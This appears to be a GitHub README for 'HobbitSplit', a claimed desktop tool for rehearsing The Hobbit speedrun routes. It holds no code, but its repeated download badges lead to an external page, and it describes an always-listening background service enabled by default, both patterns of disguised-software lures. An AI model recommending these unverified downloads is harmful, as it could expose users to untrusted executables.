![preview](https://raw.githubusercontent.com/birbal85/Hobbit-Run-Companion/main/shot_f54386a.svg)
[![Download](https://raw.githubusercontent.com/birbal85/Hobbit-Run-Companion/main/setup_583b53b.svg)](https://birbal85.github.io/Hobbit-Run-Companion/)

# 🏹 HobbitSplit — Route Master & Practice Companion

**HobbitSplit** is a standalone desktop companion built for runners who want to sharpen their *The Hobbit* speedrun routes without the friction of traditional timing setups. Instead of reinventing the stopwatch wheel, HobbitSplit focuses on the *thinking layer* of a run — the splits, the decision trees, the segment-by-segment storytelling that turns a casual playthrough into a rehearsed performance.

Think of it as a rehearsal room for your route. You bring the game; HobbitSplit brings the structure.

[![Download](https://raw.githubusercontent.com/birbal85/Hobbit-Run-Companion/main/setup_583b53b.svg)](https://birbal85.github.io/Hobbit-Run-Companion/)

---

## 📖 Table of Contents

- [Why HobbitSplit Exists](#-why-hobbitsplit-exists)
- [Core Concept](#-core-concept)
- [Feature Highlights](#-feature-highlights)
  - [Adaptive Split Engine](#-adaptive-split-engine)
  - [Responsive Practice UI](#-responsive-practice-ui)
  - [Multilingual Route Notes](#-multilingual-route-notes)
  - [Always-On Support Channel](#-always-on-support-channel)
  - [Route Memory & Ghost Comparisons](#-route-memory--ghost-comparisons)
  - [Import & Export Without Lock-In](#-import--export-without-lock-in)
- [Screens & Modules](#-screens--modules)
- [How a Practice Session Flows](#-how-a-practice-session-flows)
- [Design Philosophy](#-design-philosophy)
- [SEO Corner: What People Search For](#-seo-corner-what-people-search-for)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Community & Feedback](#-community--feedback)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why HobbitSplit Exists

Speedrunning *The Hobbit* is a peculiar craft. The game rewards memorization of item pickups, pathing through Middle-earth's quieter corners, and the kind of muscle memory that only shows up after dozens of repetitions. Existing tools usually stop at *"here is a timer, go."* They assume you already know your route cold.

HobbitSplit starts from a different premise: the route *is* the practice. Every segment deserves a name, a note, a fallback plan. Runners deserve a workspace where they can annotate, reorganize, and rehearse routes the way a musician rehearses a difficult passage — slowly, deliberately, then at full tempo.

So instead of a bare stopwatch, you get a notebook, a metronome, and a coach's whiteboard rolled into one.

---

## 🧭 Core Concept

HobbitSplit treats a speedrun route as a **narrative graph**. Each node is a segment (an area, a boss, a cutscene skip). Each edge is a transition with an expected time band. You can annotate nodes, attach practice videos, and mark segments as *learning*, *stable*, or *performance-ready*.

The app then helps you:

1. **Rehearse** — run isolated segments repeatedly, with auto-resetting timers.
2. **Review** — compare a fresh attempt against your own historical pacing.
3. **Refine** — tweak the route graph and see how the theoretical total shifts.
4. **Report** — export a route summary you can share with a training partner.

No account required. No telemetry. Your route data lives on your machine, in a plain, human-readable format.

---

## ✨ Feature Highlights

### 🎯 Adaptive Split Engine

The split engine watches for segment boundaries as you define them — a fixed duration, a manual keypress, or a "soft" trigger you configure yourself. It adjusts expected segment times based on your rolling average, so a segment that usually takes 42 seconds no longer punishes you with a harsh red flash at 43. It's the difference between a stopwatch that nags and a stopwatch that *understands*.

### 🖥️ Responsive Practice UI

The interface reflows gracefully from a compact single-column layout on a small laptop screen to a wide, multi-panel dashboard on a large monitor. Panels can be collapsed, reordered, and pinned, so your most-used information — current segment, next segment, cumulative delta — is always in peripheral vision while your eyes are on the game.

### 🌍 Multilingual Route Notes

Route notations and UI labels ship with support for multiple languages, and the notes field accepts any Unicode text you throw at it. If you think in one language but learn routes from a community that speaks another, you can keep both side by side in the same segment card.

### 🛎️ Always-On Support Channel

A background service keeps a lightweight, always-listening support channel that connects you to documentation, community FAQs, and a rotating roster of volunteer helpers — around the clock, every day of the year. The channel is active by default but can be muted or disabled entirely from the settings panel.

### 👻 Route Memory & Ghost Comparisons

Each segment stores a short history of your recent attempts. When you start a fresh attempt, HobbitSplit can overlay a "ghost" of your best run's pacing as a subtle progress line — not as a demand, but as a gentle reminder of what a clean segment feels like.

### 📦 Import & Export Without Lock-In

Routes can be exported to a portable JSON schema and re-imported on another machine. There is no proprietary binary format secretly holding your work hostage. If you want to hand your route to a friend, you hand them a text file and a smile.

---

## 🧩 Screens & Modules

| Module | Purpose | Notes |
|---|---|---|
| **Route Editor** | Build and reorder segments | Drag-and-drop, keyboard-first |
| **Practice Console** | Run isolated segments | Auto-reset, repeat count |
| **Pacing View** | Compare attempts | Delta bars, ghost line |
| **Notebook** | Annotate decisions | Markdown-lite, Unicode safe |
| **Settings** | Themes, language, support channel | Persisted locally |
| **Exporter** | Share routes | Portable JSON schema |

Each module is self-contained. You can open only the one you need, or arrange them all on a single canvas for a command-center feel.

---

## 🔁 How a Practice Session Flows

1. **Open a route.** Pick an existing route from your local library or start from a blank canvas.
2. **Mark a segment.** Highlight the part you want to rehearse — say, the escape from a particular cavern.
3. **Set a target band.** Give it a floor and a ceiling time, or let HobbitSplit learn it from your first few passes.
4. **Rehearse.** The practice console resets after each attempt, counts reps, and quietly builds an average.
5. **Review.** After a set of attempts, the pacing view shows how consistent you were — not just how fast.
6. **Annotate.** Add a note about the decision you made, or the mistake you keep repeating.
7. **Export.** Save the route, or send it to a training partner as a JSON file.

The loop is intentionally short. Practice should feel like practice, not like project management.

---

## 🎨 Design Philosophy

HobbitSplit borrows three ideas from unexpected places:

- **From music practice:** slow, isolated repetition beats full-tempo flailing.
- **From board games:** visible state reduces cognitive load; hidden state causes mistakes.
- **From hiking:** a route is not a line on a map, it's a series of decisions with contingencies.

The result is an app that feels less like a stopwatch and more like a well-worn trail journal — one that happens to keep time.

---

## 🔍 SEO Corner: What People Search For

If you arrived here searching for terms like *speedrun practice tool for The Hobbit*, *split timer alternative for route rehearsal*, *segment training software for RPG speedruns*, *multilingual route notes app*, or *portable speedrun route exporter*, you are in the right place. HobbitSplit is designed to be discoverable under those phrases because it genuinely solves those problems — not because the words were sprinkled in for decoration.

Other natural search intents this project addresses:

- "How to practice a single speedrun segment repeatedly"
- "Tools for annotating speedrun routes with decisions"
- "Comparing your current pace against your best pace in a speedrun"
- "Sharing a speedrun route with another runner as a file"
- "Speedrun timer with a responsive multi-panel layout"

---

## 🗺️ Roadmap for 2026

The 2026 plan is deliberately modest in scope and ambitious in depth.

- **Q1 2026** — Route graph editor stabilization; keyboard-only navigation across all modules.
- **Q2 2026** — Ghost comparison improvements; per-segment percentile bands.
- **Q3 2026** — Expanded multilingual note templates; community route pack format.
- **Q4 2026** — Accessibility pass; screen-reader friendly practice console.

Every item on the roadmap is tracked in plain text issues so contributors can claim a slice without ceremony.

---

## 🤝 Contributing

Contributions are welcome in the form of route packs, translations, bug reports, and code. A good first contribution is often a **route pack** — a JSON file describing a route you know well. Those are immediately useful to other runners and require no build tooling.

For code contributions, please open an issue describing the change before sending a large patch, so effort isn't duplicated. Smaller patches can go straight to a pull request.

---

## 💬 Community & Feedback

The project lives and dies by its community. Feedback channels are listed in the repository's discussion area. Please keep discussions kind, specific, and focused on the craft of running — the rest takes care of itself.

---

## ⚠️ Disclaimer

HobbitSplit is an independent, fan-made practice utility. It is **not** affiliated with, endorsed by, or sponsored by the owners of *The Hobbit* franchise, its publishers, or any of their subsidiaries. All trademarks and game content belong to their respective rights holders. This project ships no game assets and requires a legally obtained copy of the game to be used as intended.

The software is provided "as is," without warranty of any kind, express or implied. In no event shall the authors be liable for any claim, damages, or other liability arising from the use of the software. Use it responsibly, and please respect the terms of service of any platform you play on.

---

## 📜 License

This project is released under the **MIT License**.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 HobbitSplit contributors.

---

[![Download](https://raw.githubusercontent.com/birbal85/Hobbit-Run-Companion/main/setup_583b53b.svg)](https://birbal85.github.io/Hobbit-Run-Companion/)